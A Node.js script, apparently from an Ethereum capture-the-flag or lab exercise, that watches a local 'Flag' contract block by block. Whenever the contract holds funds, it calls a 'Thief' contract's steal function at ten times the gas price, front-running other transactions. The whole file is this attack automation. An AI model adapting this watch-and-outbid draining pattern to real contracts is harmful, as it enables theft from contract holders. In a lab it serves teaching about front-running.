#!/usr/bin/env node

// Pass parameters to this script
//     - cohort folder
if (process.argv.length < 3) {
    console.error("Usage:", __filename, "/path/to/geth.ipc");
    process.exit(1);
}
const gethIpc = process.argv[2];

const Promise = require("bluebird");
const BigNumber = require("bignumber.js");
const Web3 = require("web3");
const net = require("net");
const web3 = new Web3(new Web3.providers.IpcProvider(gethIpc, net));
Promise.promisifyAll(web3.eth, { suffix: "Promise" });

const truffleContract = require("truffle-contract");
const ThiefJson = require("../build/contracts/Thief.json");
const Thief = truffleContract(ThiefJson);
Thief.setProvider(web3.currentProvider);
const FlagJson = require("../build/contracts/Flag.json");
const Flag = truffleContract(FlagJson);
Flag.setProvider(web3.currentProvider);

const sequentialPromiseNamed = require("../utils/sequentialPromiseNamed.js");

const conditionalSteal = function(flag, thief, account) {
    return web3.eth.getBalancePromise(flag.address)
        .then(balance => {
            if (new BigNumber(balance).isGreaterThan(0)) {
                return web3.eth.getGasPricePromise()
                    .then(gasPrice => thief.steal.sendTransaction(
                        flag.address, "mwahaha", { from: account, gasPrice: gasPrice.times(10) }))
                    .then(txHash => console.log("Balance:", balance.toString(10), ", stealing, tx:", txHash));
            } else {
                console.log("Balance:", balance.toString(10), ", waiting");
            }
        });
};

sequentialPromiseNamed({
        thief: () => Thief.deployed(),
        flag: () => Flag.deployed(),
        account: () => web3.eth.getAccountsPromise().then(accounts => accounts[0])
    })
    .then(elements => {
        console.log("Started watching Flag", elements.flag.address);
        return conditionalSteal(elements.flag, elements.thief, elements.account)
            .then(() => {
                web3.eth.filter("latest").watch((error, result) => {
                    console.log("Latest block:", result);
                    return conditionalSteal(elements.flag, elements.thief, elements.account)
                        .catch(console.error);
                });
            });
    })
    .catch(console.error);

